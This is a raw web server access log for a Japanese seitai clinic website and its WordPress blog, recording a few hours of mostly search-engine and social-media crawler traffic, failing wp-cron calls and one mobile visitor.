219.94.203.142 - - [23/Sep/2018:04:35:29 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537644929.0869159698486328125000 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.138 - - [23/Sep/2018:04:35:28 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1200/ HTTP/1.1" 200 17211 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
46.229.168.148 - - [23/Sep/2018:05:09:21 +0900] "GET /robots.txt HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:05:09:26 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537646966.2130339145660400390625 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.135 - - [23/Sep/2018:05:09:25 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1617/ HTTP/1.1" 200 17859 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
173.252.87.9 - - [23/Sep/2018:05:23:54 +0900] "GET / HTTP/1.1" 301 240 "https://www.facebook.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:55 +0900] "GET / HTTP/1.1" 200 16214 "https://www.facebook.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:55 +0900] "GET /Scripts/jquery.quicksilver.js HTTP/1.1" 200 3873 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:55 +0900] "GET /Scripts/core.js HTTP/1.1" 200 9865 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:55 +0900] "GET /css/common.css HTTP/1.1" 200 3235 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:55 +0900] "GET /Scripts/jquery.simpleFAQ-0.7.min.js HTTP/1.1" 200 4623 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:55 +0900] "GET /css/index.css HTTP/1.1" 200 17509 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:55 +0900] "GET /images/welcome2.jpg HTTP/1.1" 200 22355 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:55 +0900] "GET /Scripts/jquery-1.3.2.min.js HTTP/1.1" 200 57254 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:56 +0900] "GET /images/nayami.png HTTP/1.1" 200 10042 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:56 +0900] "GET /images/nayami01.jpg HTTP/1.1" 200 26267 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:56 +0900] "GET /images/living.png HTTP/1.1" 200 156481 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:56 +0900] "GET /images/nayami02.jpg HTTP/1.1" 200 25880 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:57 +0900] "GET /images/info_bg.gif HTTP/1.1" 200 1266 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:56 +0900] "GET /images/living2.png HTTP/1.1" 200 161547 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:57 +0900] "GET /images/inquiry.jpg HTTP/1.1" 200 15317 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:57 +0900] "GET /images/url.jpg HTTP/1.1" 200 3667 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:56 +0900] "GET /images/h2_index.jpg HTTP/1.1" 200 168504 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:57 +0900] "GET /images/header_bg.jpg HTTP/1.1" 200 719 "http://www.nishifuna-seitai.com/css/common.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:56 +0900] "GET /images/nishifuna-para.jpg HTTP/1.1" 200 71547 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:56 +0900] "GET /images/about03.png HTTP/1.1" 200 563309 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:57 +0900] "GET /images/mnavi.jpg HTTP/1.1" 200 74152 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:57 +0900] "GET /images/medical_navi.jpg HTTP/1.1" 200 49483 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:57 +0900] "GET /images/medical_bg.gif HTTP/1.1" 200 921 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:57 +0900] "GET /images/staff_img.png HTTP/1.1" 200 51569 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:57 +0900] "GET /images/head_index.jpg HTTP/1.1" 200 47751 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:57 +0900] "GET /images/mobile_bg.jpg HTTP/1.1" 200 17491 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:58 +0900] "GET /images/head_logo.jpg HTTP/1.1" 200 25497 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/staff.gif HTTP/1.1" 200 14075 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:58 +0900] "GET /images/coupon.gif HTTP/1.1" 200 17120 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:58 +0900] "GET /images/blogbanner2.jpg HTTP/1.1" 200 24556 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:58 +0900] "GET /images/mobile_title.jpg HTTP/1.1" 200 12500 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/inquiry_title.jpg HTTP/1.1" 200 15058 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/welcome.jpg HTTP/1.1" 200 11086 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:58 +0900] "GET /images/info_title.gif HTTP/1.1" 200 4422 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:57 +0900] "GET /images/bg_index.jpg HTTP/1.1" 200 352486 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:58 +0900] "GET /images/tel.gif HTTP/1.1" 200 621 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:58 +0900] "GET /images/medical_title.gif HTTP/1.1" 200 1779 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/hnavi.jpg HTTP/1.1" 200 19073 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/arrow01.gif HTTP/1.1" 200 296 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/head_access.jpg HTTP/1.1" 200 2972 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:58 +0900] "GET /images/head_sitemap.jpg HTTP/1.1" 200 2620 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:58 +0900] "GET /images/bn_twitter.png HTTP/1.1" 200 12841 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /images/bn_facebook.png HTTP/1.1" 200 9905 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:58 +0900] "GET /cgi-bin/daycount/daycount.cgi?gif HTTP/1.1" 500 2553 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:58 +0900] "GET /images/nayami03.jpg HTTP/1.1" 200 26025 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:59 +0900] "GET /images/nayami04.jpg HTTP/1.1" 200 26069 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:59 +0900] "GET /images/nayami05.jpg HTTP/1.1" 200 26112 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:59 +0900] "GET /images/nayami06.jpg HTTP/1.1" 200 26091 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.10 - - [23/Sep/2018:05:23:59 +0900] "GET /images/nayami07.jpg HTTP/1.1" 200 26356 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.9 - - [23/Sep/2018:05:23:59 +0900] "GET /images/nayami09.jpg HTTP/1.1" 200 26281 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.8 - - [23/Sep/2018:05:23:59 +0900] "GET /images/footer_info_bg.gif HTTP/1.1" 200 1104 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:59 +0900] "GET /images/design.jpg HTTP/1.1" 200 2965 "http://www.nishifuna-seitai.com/css/index.css" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:59 +0900] "GET /images/nayami08.jpg HTTP/1.1" 200 26211 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.87.14 - - [23/Sep/2018:05:23:59 +0900] "GET /favicon.ico HTTP/1.1" 200 1150 "http://www.nishifuna-seitai.com/" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
69.171.251.23 - - [23/Sep/2018:05:24:28 +0900] "GET /images/living2.png HTTP/1.1" 200 161547 "-" "-"
69.171.251.42 - - [23/Sep/2018:05:24:28 +0900] "GET /images/living2.png HTTP/1.1" 200 161547 "-" "-"
69.171.251.13 - - [23/Sep/2018:05:24:28 +0900] "GET /images/living2.png HTTP/1.1" 200 161547 "-" "-"
69.171.251.5 - - [23/Sep/2018:05:24:30 +0900] "GET /images/living2.png HTTP/1.1" 200 161547 "-" "-"
219.94.203.142 - - [23/Sep/2018:05:33:54 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537648434.6738839149475097656250 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
134.249.141.24 - - [23/Sep/2018:05:33:53 +0900] "GET /blog//license.php HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
134.249.141.24 - - [23/Sep/2018:05:33:58 +0900] "GET /blog/license.php HTTP/1.1" 404 6711 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
46.229.168.147 - - [23/Sep/2018:05:34:52 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1519/ HTTP/1.1" 200 18049 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
42.236.102.3 - - [23/Sep/2018:05:42:07 +0900] "GET /about/ HTTP/1.1" 200 10210 "http://www.nishifuna-seitai.com/about/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.102.3 - - [23/Sep/2018:05:42:07 +0900] "GET / HTTP/1.1" 200 16214 "http://www.nishifuna-seitai.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
219.94.203.142 - - [23/Sep/2018:05:42:08 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537648928.3660280704498291015625 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
42.236.99.178 - - [23/Sep/2018:05:42:08 +0900] "GET /blog/ HTTP/1.1" 200 26829 "http://www.nishifuna-seitai.com/blog/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
46.229.168.139 - - [23/Sep/2018:05:48:43 +0900] "GET /treatment/normal/ HTTP/1.1" 200 11375 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:05:49:09 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537649349.4945099353790283203125 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.135 - - [23/Sep/2018:05:49:09 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1294/ HTTP/1.1" 200 17388 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:05:52:06 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537649526.9610660076141357421875 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.137 - - [23/Sep/2018:05:52:06 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1217/ HTTP/1.1" 200 17673 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:05:54:01 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537649641.4557340145111083984375 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
40.77.167.89 - - [23/Sep/2018:05:54:01 +0900] "GET /blog/page/3/ HTTP/1.1" 200 29590 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
219.94.203.142 - - [23/Sep/2018:06:06:04 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537650364.2974290847778320312500 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.143 - - [23/Sep/2018:06:06:04 +0900] "GET /blog/ HTTP/1.1" 200 26829 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:06:08:22 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537650502.9649250507354736328125 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.143 - - [23/Sep/2018:06:08:22 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1296/ HTTP/1.1" 200 17637 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
95.163.255.97 - - [23/Sep/2018:06:13:57 +0900] "GET /robots.txt HTTP/1.0" 404 2275 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
95.163.255.96 - - [23/Sep/2018:06:14:00 +0900] "GET / HTTP/1.1" 200 16214 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
46.229.168.144 - - [23/Sep/2018:06:17:15 +0900] "GET /robots.txt HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:06:17:18 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537651038.9349598884582519531250 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.141 - - [23/Sep/2018:06:17:18 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1931/ HTTP/1.1" 200 17978 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:06:20:38 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537651238.4816589355468750000000 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.144 - - [23/Sep/2018:06:20:38 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1607/ HTTP/1.1" 200 17707 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:06:22:29 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537651349.4470920562744140625000 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
180.58.42.228 - - [23/Sep/2018:06:22:29 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/ HTTP/1.1" 200 17412 "https://www.google.co.jp/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:30 +0900] "GET /blog/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.3.3 HTTP/1.1" 200 887 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:30 +0900] "GET /blog/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.25.0-2013.01.18 HTTP/1.1" 200 15158 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:30 +0900] "GET /blog/wp-content/themes/twentytwelve/style.css?ver=3.5.1 HTTP/1.1" 200 35292 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:30 +0900] "GET /blog/wp-includes/js/jquery/jquery.js?ver=1.8.3 HTTP/1.1" 200 93658 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:30 +0900] "GET /blog/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.3.3 HTTP/1.1" 200 6933 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:30 +0900] "GET /blog/wp-content/uploads/2012/12/h2_index2.png HTTP/1.1" 200 394553 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:31 +0900] "GET /blog/wp-content/themes/twentytwelve/js/navigation.js?ver=1.0 HTTP/1.1" 200 863 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
180.58.42.228 - - [23/Sep/2018:06:22:31 +0900] "GET /blog/wp-content/uploads/2014/12/IMG_1018.jpg HTTP/1.1" 200 657369 "http://www.nishifuna-seitai.com/blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1342/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
216.244.66.226 - - [23/Sep/2018:06:23:22 +0900] "GET /robots.txt HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
219.94.203.142 - - [23/Sep/2018:06:23:53 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537651433.8644459247589111328125 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.129 - - [23/Sep/2018:06:23:53 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1210/ HTTP/1.1" 200 17240 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:06:29:43 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537651783.1279630661010742187500 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
54.36.148.199 - - [23/Sep/2018:06:29:42 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1407/feed/ HTTP/1.1" 200 1063 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
219.94.203.142 - - [23/Sep/2018:06:31:09 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537651869.6558070182800292968750 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
54.36.148.74 - - [23/Sep/2018:06:31:09 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1617/feed/ HTTP/1.1" 200 1045 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
46.229.168.141 - - [23/Sep/2018:06:31:57 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1294/ HTTP/1.1" 200 17388 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:06:50:02 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537653002.4129199981689453125000 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
40.77.167.89 - - [23/Sep/2018:06:50:02 +0900] "GET /blog/page/3/ HTTP/1.1" 200 29590 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.226 - - [23/Sep/2018:07:06:49 +0900] "GET /robots.txt HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.69.117 - - [23/Sep/2018:07:11:23 +0900] "GET /treatment/pelvis/ HTTP/1.1" 200 10771 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.36.148.65 - - [23/Sep/2018:07:25:08 +0900] "GET / HTTP/1.1" 200 16214 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
219.94.203.142 - - [23/Sep/2018:07:41:25 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537656085.7673110961914062500000 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
216.244.66.226 - - [23/Sep/2018:07:41:25 +0900] "GET /blog/page/51/ HTTP/1.1" 200 28135 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.226 - - [23/Sep/2018:07:44:40 +0900] "GET /blog/category/%E6%9C%AA%E5%88%86%E9%A1%9E/page/39/ HTTP/1.1" 200 24927 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
219.94.203.142 - - [23/Sep/2018:07:44:41 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537656281.1484239101409912109375 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
66.249.69.117 - - [23/Sep/2018:07:46:32 +0900] "GET /news/treatment/ HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.229.168.148 - - [23/Sep/2018:08:23:59 +0900] "GET /robots.txt HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:08:24:01 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537658641.7835199832916259765625 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
